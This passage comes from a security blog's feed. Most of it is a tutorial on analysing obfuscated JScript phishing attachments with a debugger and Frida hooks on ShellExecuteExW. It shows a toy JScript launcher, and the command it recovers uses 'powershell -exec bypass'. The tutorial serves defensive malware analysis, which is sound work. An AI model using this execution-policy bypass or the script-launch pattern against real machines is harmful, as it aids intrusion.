        &lt;/li&gt;
        &lt;li id=&quot;fn:fn-Consumer_Types&quot;&gt;
        &lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/wmisdk/receiving-a-wmi-event&quot;&gt;WMI Consumer Types&lt;/a&gt; &lt;a href=&quot;#fnref:fn-Consumer_Types&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
        &lt;/li&gt;
        &lt;li id=&quot;fn:fn-Set_WmiInstance&quot;&gt;
        &lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-wmiinstance?view=powershell-5.1&quot;&gt;Set-WmiInstance&lt;/a&gt; &lt;a href=&quot;#fnref:fn-Set_WmiInstance&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
        &lt;/li&gt;
        &lt;li id=&quot;fn:fn-WQL&quot;&gt;
        &lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi&quot;&gt;WMI Query Langauge&lt;/a&gt; &lt;a href=&quot;#fnref:fn-WQL&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
        &lt;/li&gt;
        &lt;li id=&quot;fn:fn-Consumers&quot;&gt;
        &lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/wmisdk/monitoring-and-responding-to-events-with-standard-consumers&quot;&gt;Consumers&lt;/a&gt; &lt;a href=&quot;#fnref:fn-Consumers&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
        &lt;/li&gt;
        &lt;li id=&quot;fn:fn-Invoke_WebRequest&quot;&gt;
        &lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7&quot;&gt;Get-WmiObject&lt;/a&gt; &lt;a href=&quot;#fnref:fn-Invoke_WebRequest&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
        &lt;/li&gt;
        &lt;li id=&quot;fn:fn-Invoke_Expression&quot;&gt;
        &lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7&quot;&gt;Invoke-Expression&lt;/a&gt; &lt;a href=&quot;#fnref:fn-Invoke_Expression&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
        &lt;/li&gt;
        &lt;li id=&quot;fn:fn-Get_WmiObject&quot;&gt;
        &lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1&quot;&gt;Get-WmiObject&lt;/a&gt; &lt;a href=&quot;#fnref:fn-Get_WmiObject&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
        &lt;/li&gt;
        &lt;/ol&gt;
        &lt;/div&gt;
      </content>
    </entry>
    <entry>
      <title>Battlefield Malware Analysis (Part 1)</title>
      <link href="https://digital-selfdefense.net/2019/11/30/Battlefield-Malware-Analysis.html"/>
      <updated>2019-11-30T11:00:02+01:00</updated>
      <id>https://digital-selfdefense.net/2019/11/30/Battlefield-Malware-Analysis</id>
      <content type="html">&lt;div class=&quot;message&quot;&gt;
        Hello Folks! In this blog post series named &quot;Battlefield Malware Analysis&quot; we will be investigating different tools and techniques 
        that you as a Malware Analysts / SOC Analyst / Incident Responder / (you name it) can use to make your life easier when dealing 
        with Malware Analysis. The &quot;Battlefield&quot; aspect of this blog post series stems from the fact that we will be covering real life malware analysis 
        problems which we encounter on a daily basis, and show you simple yet effective ways to cope with them. This blog post series aims to be 
        as practical as possible, by this we mean that we won't solely focus on the theoretical aspects of malware analysis but rather get our hands 
        dirty by dissecting malware.
        &lt;/div&gt;
        &lt;p&gt;Enough talk. Now it’s time to fasten our seatbelts and dig through some malware!&lt;/p&gt;
        &lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
        &lt;p&gt;In the first part of “Battlefield Malware Analysis” we will take a look at script based obfuscation and how it can be defeated in a fast and efficient way by using process injection and API hooking. Before we jump straight into the practical part let us define what we mean by script based obfuscation and why it is still so prevalent these days.&lt;/p&gt;
        &lt;p&gt;Script based obfuscation is a technique used by malware authors that allows them to hide the malicious intent of their scripts from malware analysts and anti-virus. This is achieved by abusing scripting language features like eval functions&lt;sup id=&quot;fnref:fn-eval_function&quot;&gt;&lt;a href=&quot;#fn:fn-eval_function&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;, anonymous functions&lt;sup id=&quot;fnref:fn-anonymous_function&quot;&gt;&lt;a href=&quot;#fn:fn-anonymous_function&quot; class=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt; and string based encryption, encoding or transformation.&lt;/p&gt;
        &lt;p&gt;When we think of recent malware campaigns we often see that the initial attack vector used by todays attackers is still phishing. With the help of legitimate looking phishing e-mails attackers are able to get a first foothold into their target organization.&lt;/p&gt;
        &lt;p&gt;Back in the golden days of malware (80’s and 90’s) it was very common to see malicious attachments like for example “file.pdf.exe” as part of phishing e-mails. Nowadays people are aware of the fact there is baerly no valid reason to deliver exectuable files via e-mail attachments, and therefore we often see them being blocked by default.&lt;/p&gt;
        &lt;p&gt;Malware authors adapted to these restrictions by abusing legitimate file formats which are commonly used as e-mail attachments and provide some sort of scripting capabilities which will allow them to download and execute malicious code on their victims host.&lt;/p&gt;
        &lt;p&gt;The prevalence of script based obfuscation techniques during the delivery stage of the Cyber Kill-Chain&lt;sup id=&quot;fnref:fn-cyber_kill_chain&quot;&gt;&lt;a href=&quot;#fn:fn-cyber_kill_chain&quot; class=&quot;footnote&quot;&gt;3&lt;/a&gt;&lt;/sup&gt; is closely related to the fact that executable files are no longer a reliable way for initial infection.&lt;/p&gt;
        &lt;h2 id=&quot;scenario&quot;&gt;Scenario&lt;/h2&gt;
        &lt;p&gt;Now it’s time to introduce the scenario that we will be dealing within the first part of our blog post series:&lt;/p&gt;
        &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;You are a malware analyst tasked to analyze a bunch of malicious JScript attachments that were 
        delivered as part of phishing campaign to a group of c-level executives from your company. 
        Some of the c(lick) level executives from your company already opened the attachments and now you are
        in a hurry because they expect quick answers to clarify what happend.
        It's time to boot up your analyst workstation and provide the information your they requested from you. &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
        &lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/11/post3/files/obfuscated.js&quot;&gt;Here&lt;/a&gt; you can download the malicious JScript attachment.&lt;/p&gt;
        &lt;h2 id=&quot;lab-setup&quot;&gt;Lab Setup&lt;/h2&gt;
        &lt;p&gt;In order to complete the exercise and become the hero of your company we recommend the following tools:&lt;/p&gt;
        &lt;ol&gt;
        &lt;li&gt;Windows Server 2012 R2 64-Bit&lt;/li&gt;
        &lt;li&gt;Python 3.7.5&lt;/li&gt;
        &lt;li&gt;Frida 12.7.20&lt;/li&gt;
        &lt;li&gt;wscript.exe&lt;/li&gt;
        &lt;li&gt;(x64dbg [Apr 29 2019])&lt;/li&gt;
        &lt;/ol&gt;
        &lt;p&gt;Other OS/Software versions will probably work too.&lt;/p&gt;
        &lt;h2 id=&quot;which-apis-to-look-for&quot;&gt;Which APIs to look for?&lt;/h2&gt;
        &lt;p&gt;When dealing with malicious scripts like VBScript or JScript you will notice that the vast majority of malicious scripts depend on activex controls&lt;sup id=&quot;fnref:fn-activex_control&quot;&gt;&lt;a href=&quot;#fn:fn-activex_control&quot; class=&quot;footnote&quot;&gt;4&lt;/a&gt;&lt;/sup&gt; / COM Objects&lt;sup id=&quot;fnref:fn-COM_object&quot;&gt;&lt;a href=&quot;#fn:fn-COM_object&quot; class=&quot;footnote&quot;&gt;5&lt;/a&gt;&lt;/sup&gt; to overcome the limitations imposed by the scripting language interpreter. By using activex controls from within JScript for example it is possible to accomplish certain tasks such as writing to the registry, creating files or executing other applications, which would be otherwise not possible without direct access to the Windows API. Malware authors will very likely try to hide those kind of actions by using obfuscation techniques for the purpose of avoiding detection from human analysts and anti-virus. The following JScript named “example.js” is intended as a toy example to demonstrate how activex controls can be used to start another application:&lt;/p&gt;
        &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt; 
        &lt;span class=&quot;c1&quot;&gt;// example.js&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;language&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;JScript&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fnShellExecuteJ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;objShell&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ActiveXObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;shell.application&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;objShell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ShellExecute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;notepad.exe&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/script&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
        &lt;p&gt;In Microsoft Windows, JScript files are associated with the Windows Script Host&lt;sup id=&quot;fnref:fn-windows_script_host&quot;&gt;&lt;a href=&quot;#fn:fn-windows_script_host&quot; class=&quot;footnote&quot;&gt;6&lt;/a&gt;&lt;/sup&gt; (wscript.exe). This means that when a user double clicks a JScript file it will immediately be executed by wscript.exe. These circumstances are the reason why obfuscated JScript files are so popular among attackers. They provide a simple and effecitve way of executing malicious code on a target system. In the case of “example.js” a double click would result in the execution of the Windows API function &lt;code class=&quot;highlighter-rouge&quot;&gt;ShellExecuteExW&lt;/code&gt; from &lt;code class=&quot;highlighter-rouge&quot;&gt;Shell32.dll&lt;/code&gt;, which in turn will create the process “notepad.exe”.&lt;/p&gt;
        &lt;p&gt;But how does wscript.exe know that &lt;code class=&quot;highlighter-rouge&quot;&gt;ShellExecuteExW&lt;/code&gt;&lt;sup id=&quot;fnref:fn-msdn_ShellExecuteExW&quot;&gt;&lt;a href=&quot;#fn:fn-msdn_ShellExecuteExW&quot; class=&quot;footnote&quot;&gt;7&lt;/a&gt;&lt;/sup&gt; is implemented in &lt;code class=&quot;highlighter-rouge&quot;&gt;Shell32.dll&lt;/code&gt;? This information can be obtained from the windows registry in two simple steps:&lt;/p&gt;
        &lt;ol&gt;
        &lt;li&gt;wscript.exe needs to lookup &lt;code class=&quot;highlighter-rouge&quot;&gt;HKEY_CLASSES_ROOT\Shell.Application\CLSID&lt;/code&gt;.&lt;/li&gt;
        &lt;li&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;CLSID = {?}&lt;/code&gt; value is used by wscript.exe to lookup the &lt;code class=&quot;highlighter-rouge&quot;&gt;InProcServer32&lt;/code&gt; under &lt;code class=&quot;highlighter-rouge&quot;&gt;HKEY_CLASSES_ROOT\CLSID\{?}&lt;/code&gt;, which holds the implementation of &lt;code class=&quot;highlighter-rouge&quot;&gt;ShellExecuteExW&lt;/code&gt;.&lt;/li&gt;
        &lt;/ol&gt;
        &lt;p&gt;Now it’s time to take a look at the malicious JScript attachments that were send to the c-level execs of our company. The first thing we notice when we search for common keywords like &lt;code class=&quot;highlighter-rouge&quot;&gt;ShellExecute&lt;/code&gt; is that we found one match. But unlike in “example.js” the parameters passed to &lt;code class=&quot;highlighter-rouge&quot;&gt;ShellExecute&lt;/code&gt; are obfuscated, as presented in figure 1.&lt;/p&gt;
        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2019/11/post3/images/1.PNG&quot; alt=&quot;Figure 1: obfuscated.js&quot; title=&quot;obfuscated.js&quot; /&gt;&lt;/p&gt;
        &lt;p&gt;In the next step we need to get rid of the obfuscation without wasting to much precious time and brain resources on deobfuscating stuff in our head. By debugging wscript.exe and passing “obfuscated.js” as an argument it is possible to verify that the Windows API function &lt;code class=&quot;highlighter-rouge&quot;&gt;ShellExecuteExW&lt;/code&gt; indeed is executed. This can be seen in the Debbuger Window (x64dbg) depicted in figure 2:&lt;/p&gt;
        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2019/11/post3/images/2.PNG&quot; alt=&quot;Figure 2: Shell32.ShellExecuteExW&quot; title=&quot;Shell32.ShellExecuteExW&quot; /&gt;&lt;/p&gt;
        &lt;p&gt;The first argument (&lt;code class=&quot;highlighter-rouge&quot;&gt;EBP+8&lt;/code&gt;) passed to &lt;code class=&quot;highlighter-rouge&quot;&gt;ShellExecuteExW&lt;/code&gt; is pointer to the struct &lt;code class=&quot;highlighter-rouge&quot;&gt;SHELLEXECUTEINFOW&lt;/code&gt;&lt;sup id=&quot;fnref:fn-msdn_SHELLEXECUTEINFOW&quot;&gt;&lt;a href=&quot;#fn:fn-msdn_SHELLEXECUTEINFOW&quot; class=&quot;footnote&quot;&gt;8&lt;/a&gt;&lt;/sup&gt;, which contains information such as the application that needs to be exeucted, it’s commandline arguments and other settings. From an Malware Analysts standpoint the contents of the struct are very valuable because they have to be in deobfuscated form, so that &lt;code class=&quot;highlighter-rouge&quot;&gt;ShellExecuteExW&lt;/code&gt; is able to execute the intended application. This means that the deobfuscation routine needs to be applied before the arguments are passed to &lt;code class=&quot;highlighter-rouge&quot;&gt;ShellExecuteExW&lt;/code&gt;. By setting a breakpoint at &lt;code class=&quot;highlighter-rouge&quot;&gt;ShellExecuteExW&lt;/code&gt; we can capture the deobfuscated arguments passed as a pointer to the struct &lt;code class=&quot;highlighter-rouge&quot;&gt;SHELLEXECUTEINFOW&lt;/code&gt;.&lt;/p&gt;
        &lt;p&gt;In the following step we will take a look at the memory address &lt;code class=&quot;highlighter-rouge&quot;&gt;004AD94C&lt;/code&gt; in the dump section of our debbuger. This is the address where the struct &lt;code class=&quot;highlighter-rouge&quot;&gt;SHELLEXECUTEINFOW&lt;/code&gt; resides in memory:&lt;/p&gt;
        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2019/11/post3/images/3.PNG&quot; alt=&quot;Figure 3: SHELLEXECUTEINFOW&quot; title=&quot;SHELLEXECUTEINFOW&quot; /&gt;&lt;/p&gt;
        &lt;p&gt;The struct contains several fields that are of interest for further analysis. To get a complete understanding of the struct &lt;code class=&quot;highlighter-rouge&quot;&gt;SHELLEXECUTEINFOW&lt;/code&gt; we recommend to lookup the definition on msdn (&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/shellapi/ns-shellapi-shellexecuteinfow&quot;&gt;here&lt;/a&gt;). In figure 3 we can already see some of the fields like for example &lt;code class=&quot;highlighter-rouge&quot;&gt;lpVerb&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;lpFile&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;lpParameters&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;lpDirectory&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;nShow&lt;/code&gt;.&lt;/p&gt;
        &lt;p&gt;If our goal is to understand which application gets executed by &lt;code class=&quot;highlighter-rouge&quot;&gt;ShellExecuteExW&lt;/code&gt; and what arguments are passed to it during execution, we need to take a look at the fields &lt;code class=&quot;highlighter-rouge&quot;&gt;lpFile&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;lpParameters&lt;/code&gt;. When we inspect these fields we will see that “obfuscated.js” executes the following command:&lt;/p&gt;
        &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;powershell.exe -exec bypass -command &quot;whoami ; sleep 5&quot;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
        &lt;p&gt;&lt;em&gt;Success&lt;/em&gt;! Now we are able to give our boss the information he needs to calm down the c-level execs of our company. But wait! There are still some malicious JScript files left for analysis. The question now is how you can analyze them without redoing all the steps presented so far? The answer to this question will be covered in the next section. Another important question that needs to be answered is what Windows APIs to look for when dealing with obfuscated scripts? The answer is simple! We don’t know what APIs to look for beforehand because each malicious script is different. The best way to undestand what the malware does and to defeat obfuscation is to intercept all interesting APIs. You might ask yourself what APIs are interesting then? Well it depends, but the blog post “&lt;a href=&quot;https://blog.talosintelligence.com/2017/08/windbg-and-javascript-analysis.html&quot;&gt;WinDBG and JavaScript Analysis&lt;/a&gt;” from Cisco Talos is a good starting point.&lt;/p&gt;
        &lt;h2 id=&quot;analyzing-malicious-scripts-at-scale&quot;&gt;Analyzing malicious scripts at scale&lt;/h2&gt;
        &lt;p&gt;In this section of the blog post we will explaint to you how we can analyze a bunch of malicious JScript attachments without repeating the tedious steps introduced in the last section. The answer to this is simple! With the help of process injection and API Hooking, we are able to analyze the function calls of our interest. This allows us to bypass obfuscation and get an understanding of what the malicious script tries to achive on the victims machine. But what if we are really lazy people and we don’t want to implement all of this process injection&lt;sup id=&quot;fnref:fn-process_injection&quot;&gt;&lt;a href=&quot;#fn:fn-process_injection&quot; class=&quot;footnote&quot;&gt;9&lt;/a&gt;&lt;/sup&gt; and hooking&lt;sup id=&quot;fnref:fn-hooking&quot;&gt;&lt;a href=&quot;#fn:fn-hooking&quot; class=&quot;footnote&quot;&gt;10&lt;/a&gt;&lt;/sup&gt; stuff on our own? Then &lt;a href=&quot;https://frida.re/&quot;&gt;Frida&lt;/a&gt; is our answer!&lt;/p&gt;
        &lt;p&gt;But what is Frida? According to the projects webpage Frida is &lt;cite&gt;“[…] Greasemonkey for native apps, or, put in more technical terms, it’s a dynamic code instrumentation toolkit. It lets you inject snippets of JavaScript or your own library into native apps on Windows, macOS, GNU/Linux, iOS, Android, and QNX. Frida also provides you with some simple tools built on top of the Frida API. These can be used as-is, tweaked to your needs, or serve as examples of how to use the API.”&lt;/cite&gt;.&lt;/p&gt;
        &lt;p&gt;As you might guess from the description above there are plenty of things that you can do with Frida, but in our case we will solely focuse on how it can be used to automate the deobfuscation of “obfuscated.js”. Wait! so you are telling me…&lt;/p&gt;
        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2019/11/post3/images/4.jpg&quot; alt=&quot;Figure 4: Mandatory Meme&quot; title=&quot;Mandatory Meme&quot; /&gt;&lt;/p&gt;
        &lt;p&gt;Indeed, we will use Frida’s core, Gum (Instrumentation Library) and Gum’s JavaScript binding GumJS to hook &lt;code class=&quot;highlighter-rouge&quot;&gt;ShellExecuteExW&lt;/code&gt; and grab the passed arguments in a deobfuscated state. In theory this is achieved as follows:&lt;/p&gt;
        &lt;ol&gt;
        &lt;li&gt;Frida core suspends the target process wscript.exe.&lt;/li&gt;
        &lt;li&gt;Frida core creates a remote thread in the target process which then loads Frida agent (Gum + Google’s V8 Engine) distributed as a shared library.&lt;/li&gt;
        &lt;li&gt;Gum is used to hook the function &lt;code class=&quot;highlighter-rouge&quot;&gt;ShellExecuteExW&lt;/code&gt; from Shell32.dll in the target process wscript.exe.&lt;/li&gt;
        &lt;li&gt;Everytime &lt;code class=&quot;highlighter-rouge&quot;&gt;ShellExecuteExW&lt;/code&gt; is called in inside the target process our JavaScript gets executed with the help of Google’s V8 Engine, which then gives us full access to the arguments passed to &lt;code class=&quot;highlighter-rouge&quot;&gt;ShellExecuteExW&lt;/code&gt;.&lt;/li&gt;
        &lt;/ol&gt;
        &lt;p&gt;Before we start writing the JavaScript Code that will be executed instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;ShellExecuteExW&lt;/code&gt;, we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;frida-trace&lt;/code&gt; to create a template for us. Please be aware of the fact that when we run &lt;code class=&quot;highlighter-rouge&quot;&gt;frida-trace&lt;/code&gt; as presented in figure 5 the obfuscated JScript will be executed. When analyzing an unknown script this step is not recommended.&lt;/p&gt;
        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2019/11/post3/images/5.PNG&quot; alt=&quot;Figure 5: frida-trace&quot; title=&quot;frida-trace&quot; /&gt;&lt;/p&gt;
        &lt;p&gt;After running &lt;code class=&quot;highlighter-rouge&quot;&gt;frida-trace&lt;/code&gt; the directory “__handlers__\SHELL32.dll\” is created in the current path. This directory contains the JavaScript file “ShellExecuteExW.js” which represents the template mentioned earlier. The JavaScript “ShellExecuteExW.js” will be used to define the behaviour of the hooked function &lt;code class=&quot;highlighter-rouge&quot;&gt;ShellExecuteExW&lt;/code&gt;. Everytime the function &lt;code class=&quot;highlighter-rouge&quot;&gt;ShellExecuteExW&lt;/code&gt; is called within wscript.exe the hooking function &lt;code class=&quot;highlighter-rouge&quot;&gt;onEnter&lt;/code&gt; will also be executed.&lt;/p&gt;
        &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt; 
        &lt;span class=&quot;cm&quot;&gt;/**
        * Called synchronously when about to call ShellExecuteExW.
        *
        onEnter: function (log, args, state) {
        //Place your hook functionality here.
        },&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
        &lt;p&gt;The arguments passed to &lt;code class=&quot;highlighter-rouge&quot;&gt;ShellExecuteExW&lt;/code&gt;, will also be present in our hooking function &lt;code class=&quot;highlighter-rouge&quot;&gt;onEnter&lt;/code&gt;, via the array &lt;code class=&quot;highlighter-rouge&quot;&gt;args&lt;/code&gt;. Recall from the previous section that the first and only argument passed to &lt;code class=&quot;highlighter-rouge&quot;&gt;ShellExecuteExW&lt;/code&gt; is a pointer to the struct &lt;code class=&quot;highlighter-rouge&quot;&gt;SHELLEXECUTEINFOW&lt;/code&gt;. The address of the struct can now be used to access all the interesting fields which will reveal the purpose of the malicious JScript “obfuscated.js”. Figure 6 depicts the final implementation of the hooking function.&lt;/p&gt;
        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2019/11/post3/images/6.PNG&quot; alt=&quot;Figure 6: Hooking function onEnter&quot; title=&quot;Hooking function onEnter&quot; /&gt;&lt;/p&gt;
        &lt;p&gt;Finally, if we rerun &lt;code class=&quot;highlighter-rouge&quot;&gt;frida-trace&lt;/code&gt; with the same commandline arguments as in figure 5, the previously defined hooking function will be executed whenever &lt;code class=&quot;highlighter-rouge&quot;&gt;ShellExecuteExW&lt;/code&gt; is called within wscript.exe. The hooking function will then print out all of the interesting fields from the struct &lt;code class=&quot;highlighter-rouge&quot;&gt;SHELLEXECUTEINFOW&lt;/code&gt; passed to &lt;code class=&quot;highlighter-rouge&quot;&gt;ShellExecuteExW&lt;/code&gt;:&lt;/p&gt;
        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2019/11/post3/images/7.PNG&quot; alt=&quot;Figure 7: Final frida-trace &quot; title=&quot;Final frida-trace&quot; /&gt;&lt;/p&gt;
        &lt;p&gt;With the help of &lt;code class=&quot;highlighter-rouge&quot;&gt;frida-trace&lt;/code&gt; and the hooking function &lt;code class=&quot;highlighter-rouge&quot;&gt;onEnter&lt;/code&gt; from “ShellExecuteExW.js”, we can now automate the analysis of the malicious JScript attachments that were received by the c-level executives of our company.&lt;/p&gt;
        &lt;h2 id=&quot;final-thoughts&quot;&gt;Final Thoughts&lt;/h2&gt;
        &lt;p&gt;The approach presented in this blog post is based on the hypothesis that malware authors at some point will need to extend the functionality of their malicious scripts by using activex controls / COM Objects in order to get access to more powerful APIs. When doing so, it is highly likely that malware authors will try to hide the specifics (function names, arguments) of the APIs used by employing some form of obfuscation. With the help of frida we can easily intercept all the relevant API calls used by malicious scripts which allows us to bypass the implemented obfuscation techniques. Another great benefit that comes from using frida is the high grade of automation that can be achieved by using it.&lt;/p&gt;
        &lt;hr /&gt;
        &lt;p&gt;Want to see something else added? &lt;a href=&quot;https://github.com/digital-selfdefense-net/digital-selfdefense-net.github.io/issues/new&quot;&gt;Open an issue.&lt;/a&gt;&lt;/p&gt;
        &lt;div class=&quot;footnotes&quot;&gt;
        &lt;ol&gt;
        &lt;li id=&quot;fn:fn-eval_function&quot;&gt;
        &lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Eval&quot;&gt;Eval Functions&lt;/a&gt; &lt;a href=&quot;#fnref:fn-eval_function&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
        &lt;/li&gt;
        &lt;li id=&quot;fn:fn-anonymous_function&quot;&gt;
        &lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Anonymous_function&quot;&gt;Anonymous Function&lt;/a&gt; &lt;a href=&quot;#fnref:fn-anonymous_function&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
        &lt;/li&gt;
        &lt;li id=&quot;fn:fn-cyber_kill_chain&quot;&gt;
        &lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Kill_chain#The_Cyber_Kill_Chain&quot;&gt;Cyber Kill Chain&lt;/a&gt; &lt;a href=&quot;#fnref:fn-cyber_kill_chain&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
        &lt;/li&gt;
        &lt;li id=&quot;fn:fn-activex_control&quot;&gt;
        &lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/ActiveX&quot;&gt;ActiveX Control&lt;/a&gt; &lt;a href=&quot;#fnref:fn-activex_control&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
        &lt;/li&gt;
        &lt;li id=&quot;fn:fn-COM_object&quot;&gt;
        &lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Component_Object_Model&quot;&gt;COM Object&lt;/a&gt; &lt;a href=&quot;#fnref:fn-COM_object&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
        &lt;/li&gt;
        &lt;li id=&quot;fn:fn-windows_script_host&quot;&gt;
        &lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Windows_Script_Host&quot;&gt;Windows Script Host&lt;/a&gt; &lt;a href=&quot;#fnref:fn-windows_script_host&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
        &lt;/li&gt;
        &lt;li id=&quot;fn:fn-msdn_ShellExecuteExW&quot;&gt;
        &lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw&quot;&gt;ShellExecuteExW&lt;/a&gt; &lt;a href=&quot;#fnref:fn-msdn_ShellExecuteExW&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
        &lt;/li&gt;
        &lt;li id=&quot;fn:fn-msdn_SHELLEXECUTEINFOW&quot;&gt;
        &lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/de-de/windows/win32/api/shellapi/ns-shellapi-shellexecuteinfow&quot;&gt;SHELLEXECUTEINFOW&lt;/a&gt; &lt;a href=&quot;#fnref:fn-msdn_SHELLEXECUTEINFOW&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
        &lt;/li&gt;
        &lt;li id=&quot;fn:fn-process_injection&quot;&gt;
